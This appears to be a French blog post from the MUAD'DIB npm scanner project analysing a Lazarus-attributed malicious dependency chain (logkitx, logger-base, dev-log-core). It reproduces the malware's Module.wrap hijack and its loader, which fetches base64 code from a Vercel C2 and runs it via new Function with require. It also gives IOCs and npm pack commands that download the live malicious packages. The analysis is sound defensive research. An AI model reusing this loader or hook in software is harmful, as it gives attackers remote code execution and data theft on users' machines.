@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>logkitx : anatomie d'une chaîne de dépendances DPRK - MUAD'DIB</title>
+  <meta name="description" content="Trois packages npm, une chaîne de dépendances, un infostealer Lazarus. Comment MUAD'DIB détecte logkitx et dev-log-core, et pourquoi logger-base passe à travers.">
+
+  <!-- Open Graph -->
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="logkitx : anatomie d'une chaîne de dépendances DPRK">
+  <meta property="og:description" content="Trois packages npm, une chaîne de dépendances, un infostealer Lazarus. Comment MUAD'DIB détecte logkitx et dev-log-core, et pourquoi logger-base passe à travers.">
+  <meta property="og:image" content="../img/og-default.png">
+  <meta property="og:site_name" content="MUAD'DIB">
+
+  <!-- Twitter Card -->
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="logkitx : anatomie d'une chaîne de dépendances DPRK">
+  <meta name="twitter:description" content="Trois packages npm, une chaîne de dépendances DPRK/Lazarus. Module.wrap hijack, fetch+Function loader, infostealer multi-stage.">
+  <meta name="twitter:image" content="../img/og-default.png">
+
+  <link rel="stylesheet" href="../style.css">
+  <link rel="stylesheet" href="../vendor/github-dark.min.css">
+  <script src="../vendor/highlight.min.js"></script>
+  <script>hljs.highlightAll();</script>
+</head>
+<body>
+
+<nav>
+  <a href="../" class="site-name">muad-dib</a>
+  <a href="../">accueil</a>
+  <a href="./">blog</a>
+  <a href="https://github.com/DNSZLSK/muad-dib" target="_blank" rel="noopener">github</a>
+  <a href="https://www.npmjs.com/package/muaddib-scanner" target="_blank" rel="noopener">npm</a>
+</nav>
+
+<main>
+  <a href="./" class="back-link">&larr; Blog</a>
+
+  <article>
+    <div class="article-meta">
+      <h1>logkitx : anatomie d'une chaîne de dépendances DPRK</h1>
+      <span class="date">2026-04-08</span>
+      <div class="tags">
+        <span class="tag">détection</span>
+        <span class="tag">dprk</span>
+        <span class="tag">lazarus</span>
+        <span class="tag">npm</span>
+        <span class="tag">dependency-chain</span>
+        <span class="tag">live</span>
+      </div>
+    </div>
+
+    <div class="article-content">
+
+      <p>8 avril 2026. Socket.dev publie un <a href="https://socket.dev/blog/contagious-interview-campaign-spreads-across-5-ecosystems" target="_blank" rel="noopener">rapport</a> sur la campagne Contagious Interview : <strong>1 700+ packages malveillants</strong> répartis sur 5 écosystèmes (npm, PyPI, Go, Rust, PHP), attribués au groupe Lazarus (DPRK). Parmi eux, trois packages npm qui forment une chaîne de dépendances : <code>logkitx</code>, <code>logger-base</code>, <code>dev-log-core</code>.</p>
+
+      <p>J'ai scanné les trois. Voici ce que MUAD'DIB voit, ce qu'il rate, et pourquoi ce pattern de chaîne est un problème pour tous les scanners qui analysent les packages isolément.</p>
+
+      <h2>La chaîne</h2>
+
+      <p>L'attaquant distribue la charge utile sur trois couches :</p>
+
+      <table>
+        <tr><th>Package</th><th>Rôle</th><th>Score MUAD'DIB</th></tr>
+        <tr><td><code>logkitx@1.0.1</code></td><td>Entry point, Module.wrap hijack</td><td><strong>38/100</strong></td></tr>
+        <tr><td><code>logger-base@1.0.3</code></td><td>Relay, code propre, dépend de dev-log-core</td><td><strong>3/100</strong></td></tr>
+        <tr><td><code>dev-log-core@1.0.5</code></td><td>Payload, fetch + base64 + new Function</td><td><strong>29/100</strong></td></tr>
+      </table>
+
+      <p>Chaque package est inoffensif en isolation (ou presque). La chaîne complète délivre un infostealer multi-stage avec C2 Vercel actif.</p>
+
+      <h2>Ce que MUAD'DIB détecte</h2>
+
+      <h3>logkitx - Module.wrap Override (AST-066)</h3>
+
+      <p>Le premier signal est <code>logkitx/index.js</code>. Le package overrides <code>Module.wrap</code>, la fonction qui enveloppe chaque module Node.js avant exécution :</p>
+
+      <pre><code class="language-javascript">const Module = require('module');
+const originalWrap = Module.wrap;
+
+Module.wrap = function(script) {
+  // Injection de code dans CHAQUE module chargé après ce point
+  script = injectedCode + script;
+  return originalWrap(script);
+};</code></pre>
+
+      <p>La règle AST-066 détecte toute assignation à <code>Module.wrap</code>, qu'elle passe par un alias (<code>const M = require('module'); M.wrap = ...</code>) ou en inline (<code>require('module').wrap = ...</code>). Sévérité : CRITICAL. Confiance : high.</p>
+
+      <pre><code class="language-bash">$ muaddib scan logkitx-1.0.1.tgz --explain
+
+[SCORE] 38/100 [████████░░░░░░░░░░░░] MEDIUM
+    Max file: index.js (25 pts)
+    Package-level: +3 pts
+
+[ALERT] 2 threat(s) detected:
+
+  1. [MEDIUM] Suspicious Lifecycle Script
+     Rule ID:    MUADDIB-PKG-001
+     File:       package.json
+     Message:    Script "prepare" detected: npm run security:audit
+
+  2. [CRITICAL] Module.wrap Override
+     Rule ID:    MUADDIB-AST-066
+     File:       index.js
+     Confidence: high
+     Message:    Module.wrap overridden - module wrapper function
+                 hijacked, allows injecting code into every loaded
+                 module.
+     MITRE:      T1574.006</code></pre>
+
+      <p>Deux findings. Le lifecycle script <code>"prepare": "npm run security:audit"</code> est un leurre de social engineering - il fait croire que le package est sérieux sur la sécurité. L'ironie n'échappera à personne.</p>
+
+      <h3>dev-log-core - Remote Code Loading (AST-040)</h3>
+
+      <p>Le vrai payload est dans <code>dev-log-core/src/common.js</code>, enterré dans la fonction <code>enable()</code> copiée du package légitime <code>debug</code>. Le code malveillant est enveloppé de commentaires de type "debug utility feature - DO NOT USE IN PRODUCTION" pour dissuader les reviewers humains :</p>
+
+      <pre><code class="language-javascript">// Caché dans enable() - copié de debug avec payload injecté :
+
+(async function () {
+  const serviceName = 'logkit-tau';
+  const maxRetries = 10;
+  const timeoutMs = 60000;
+
+  for (let attempt = 1; attempt <= maxRetries; attempt++) {
+    try {
+      const requestUrl =
+        `https://${serviceName}.vercel.app/debugCheck?id=${namespaces}`;
+
+      const response = await fetch(requestUrl, {
+        method: 'POST',
+        signal: controller.signal
+      });
+
+      const responseData = await response.json();
+      const decodedCode = Buffer.from(
+        responseData.message, 'base64'
+      ).toString('utf8');
+
+      // require est passé au code distant - accès complet à Node.js
+      const debugFunction = new Function('require', decodedCode)(require);
+      return debugFunction;
+    } catch (error) {
+      // Retry silencieux - 10 tentatives, 60s timeout
+    }
+  }
+})();</code></pre>
+
+      <p>La règle AST-040 (<code>remote_code_load</code>) détecte le compound <code>fetch</code> + <code>new Function()</code> dans le même fichier. Aucun package npm légitime ne combine les deux. Score : 29/100.</p>
+
+      <p>Le détail qui tue : <code>new Function('require', decodedCode)(require)</code>. Le code distant reçoit <code>require</code> en paramètre. Il peut importer <code>child_process</code>, <code>fs</code>, <code>os</code>, <code>https</code> - tout Node.js. C'est un shell distant.</p>
+
+      <h3>Le stage 2 - ce que Vercel renvoie</h3>
+
+      <p>Au moment de l'analyse, le endpoint <code>logkit-tau.vercel.app/debugCheck</code> est toujours actif. Le payload base64 décodé est un infostealer obfusqué (RC4 + string array rotation) avec les capacités suivantes :</p>
+
+      <table>
+        <tr><th>Fonction</th><th>Rôle</th></tr>
+        <tr><td><code>gatherHostIdentity()</code></td><td>Fingerprint machine : hostname, username, platform, OS, IP</td></tr>
+        <tr><td><code>sendTelemetry()</code></td><td>POST des données collectées vers un C2 secondaire</td></tr>
+        <tr><td><code>downloadTestJs()</code></td><td>Télécharge un stage 3 dans le dossier temp</td></tr>
+        <tr><td><code>ensurePackageAndRun()</code></td><td>Installe le stage 3 via <code>npm install</code></td></tr>
+        <tr><td><code>runNodeTest()</code></td><td>Lance le stage 3 en <strong>processus détaché</strong> (<code>detached: true, windowsHide: true</code>)</td></tr>
+        <tr><td><code>fetchBootstrap()</code></td><td>Retry loop ~40 minutes (<code>setInterval</code> 2 412 400ms)</td></tr>
+      </table>
+
+      <p>Processus détaché, fenêtre cachée, retry de 40 minutes. Le stage 3 survit à la fermeture du processus parent.</p>
+
+      <h2>Ce que MUAD'DIB rate</h2>
+
+      <h3>logger-base - le maillon invisible</h3>
+
+      <p>Score : <strong>3/100</strong>. Sous tous les seuils d'alerte. Un seul finding : le lifecycle script <code>"prepare"</code>, commun à des milliers de packages légitimes.</p>
+
+      <p>Et c'est normal. Le code de logger-base est une copie quasi-parfaite du package <code>debug</code>. Il n'y a pas de <code>fetch</code>, pas de <code>eval</code>, pas de <code>new Function</code>. Son seul comportement malveillant est de faire <code>require('dev-log-core')</code> en ligne 1 - ce qui tire le payload dans l'arbre de dépendances.</p>
+
+      <p>C'est la technique : un package clean dont l'unique rôle est d'être un pont entre l'entry point et le payload. Le relay n'a pas de signal heuristique. Pour le détecter, il faudrait une corrélation cross-package : <em>"ce package inconnu dépend d'un autre package inconnu et récent"</em>. MUAD'DIB ne fait pas encore ça.</p>
+
+      <p>C'est un angle mort assumé. La détection fonctionne sur logkitx (38) et dev-log-core (29) - si un dev scanne ses dépendances transitives, la chaîne est repérée. Mais logger-base seul passe à travers.</p>
+
+      <h2>Reproduire le scan</h2>
+
+      <p>Les commandes pour scanner soi-même (à date, les packages sont encore sur npm) :</p>
+
+      <pre><code class="language-bash"># Installer muaddib-scanner
+npm install -g muaddib-scanner
+
+# Télécharger les tarballs
+npm pack logkitx@1.0.1
+npm pack logger-base@1.0.3
+npm pack dev-log-core@1.0.5
+
+# Scanner chaque package individuellement
+muaddib scan logkitx-1.0.1.tgz --explain
+muaddib scan logger-base-1.0.3.tgz --explain
+muaddib scan dev-log-core-1.0.5.tgz --explain
+
+# Sortie JSON pour intégration CI/CD
+muaddib scan logkitx-1.0.1.tgz --format json
+
+# Sortie SARIF pour GitHub Advanced Security
+muaddib scan logkitx-1.0.1.tgz --format sarif</code></pre>
+
+      <h2>IOC</h2>
+
+      <pre><code>Packages:     logkitx@1.0.1, logger-base@1.0.3, dev-log-core@1.0.5
+C2 stage 1:   https://logkit-tau.vercel.app/debugCheck
+Payload:      dev-log-core/src/common.js (fonction enable())
+GitHub:       aokisasakidev, alphacointech1010
+Email:        security@alphacointech1010.io
+Publié:       2026-01-29 (chaîne complète live en 30 minutes)
+Campagne:     Contagious Interview (Lazarus Group / DPRK)</code></pre>
+
+      <h2>MITRE ATT&CK</h2>
+
+      <table>
+        <tr><th>Technique</th><th>Description</th></tr>
+        <tr><td>T1195.002</td><td>Supply Chain: Software Dependencies</td></tr>
+        <tr><td>T1574.006</td><td>Hijack Execution Flow: Module Hijacking</td></tr>
+        <tr><td>T1059.007</td><td>JavaScript Execution</td></tr>
+        <tr><td>T1105</td><td>Ingress Tool Transfer</td></tr>
+        <tr><td>T1027</td><td>Obfuscated Files (RC4 + Base64)</td></tr>
+        <tr><td>T1552.001</td><td>Credentials in Files</td></tr>
+        <tr><td>T1041</td><td>Exfiltration Over C2</td></tr>
+      </table>
+
+      <h2>Leçon</h2>
+
+      <p>logkitx n'est pas un malware difficile à détecter. Module.wrap override et fetch + new Function sont des signaux forts. Le vrai problème est le design de la chaîne.</p>
+
+      <p>Trois packages, trois rôles distincts : l'entry point qui hook le module loader, le relay invisible qui ne fait rien de malveillant, et le payload qui contacte le C2. Chaque couche a une raison d'exister. L'entry point assure la persistance. Le relay dilue la suspicion. Le payload fait le travail.</p>
+
+      <p>La campagne Contagious Interview est active depuis 2024, avec 1 700+ packages sur 5 écosystèmes. Ce n'est pas un incident isolé. C'est une infrastructure de compromission à échelle industrielle, et les chaînes de dépendances sont leur technique de fragmentation préférée.</p>
+
+      <p>Pour les développeurs : <code>npm pack</code> + scan avant install. Les dépendances transitives comptent autant que les directes. Et quand un package de logging inconnu a un <code>funding</code> qui pointe vers le Open Collective de pino - c'est un vol d'identité, pas un signe de crédibilité.</p>
+
+    </div>
+  </article>
+</main>
+
+<footer>
+  MUAD'DIB / DNSZLSK / <a href="https://github.com/DNSZLSK/muad-dib" target="_blank" rel="noopener">source</a>
+</footer>
+
+</body>
+</html>
